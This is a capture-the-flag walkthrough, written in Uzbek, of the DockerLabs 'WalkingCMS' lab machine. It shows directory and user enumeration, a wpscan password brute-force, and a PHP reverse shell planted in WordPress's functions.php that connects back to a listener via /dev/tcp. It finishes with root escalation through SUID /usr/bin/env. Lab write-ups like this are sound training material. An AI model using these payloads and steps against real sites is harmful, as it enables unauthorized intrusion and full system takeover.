# WalkingCMS-dockerlabs

```
IP: 172.17.0.2
OS: Linux
Ports: 80 http
Users: mario
Vulnerability: Weak credentials (mario:love), WordPress Theme Editor RCE, SUID /usr/bin/env
```

## root flag:
> 📸 Screenshot (Notion sahifasida)

## user flag:
> 📸 Screenshot (Notion sahifasida)

---

# 1. Enumeration

Mashina nomi WalkingCMS. Mashinaning IP manzili berilgan, undan foydalanib ochiq portlarni va mavjud kataloglarni aniqlab oldim.

```bash
feroxbuster -u http://172.17.0.2 --filter-code 401,403,404
```

Feroxbuster natijasida `/wordpress` katalogi topildi. Brauzerda ochib tekshirib ko'rdim.

WordPress sayt ekanligini aniqlagach, `wpscan` yordamida foydalanuvchilarni enumeration qildim.

```bash
wpscan --url http://172.17.0.2/wordpress/ --enumerate u
```

Skanerlash natijasida `mario` nomli foydalanuvchi aniqlandi. Bundan tashqari XML-RPC yoqilganligi va backup katalogi mavjudligi ham ko'rindi.

---

# 2. Exploitation

`mario` foydalanuvchisini topganimdan so'ng, `wpscan` yordamida parolini brute-force qildim.

```bash
wpscan --url http://172.17.0.2/wordpress/ --usernames mario --passwords /usr/share/wordlists/rockyou.txt --no-update
```

Brute-force muvofaqiyatli bo'ldi. Topilgan credential: **mario:love**

---

# 3. Initial Access

WordPress admin paneliga `mario:love` credential bilan kirdim. Keyin **Appearance → Theme Code Editor** orqali `functions.php` fayliga reverse shell kodi yozdim.

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'"); ?>
```

Netcat listener ishga tushirib, WordPress sahifasini so'ragan zahotimiz shell keldi.

```bash
nc -lvnp 4444
```

Tizimga `www-data` sifatida kirdim va user flagni topdim.

---

# 4. Privilege Escalation

SUID bitli fayllarni qidirdim va `/usr/bin/env` ga SUID biriktirilganini aniqladim.

```bash
find / -perm -4000 2>/dev/null
```

```bash
/usr/bin/env /bin/bash -p
```

Root huquqiga ega bo'lganimdan so'ng `/root/root.txt` faylidan root flagni o'qidim.

---

**Mashina muvofaqiyatli yechildi!!!**
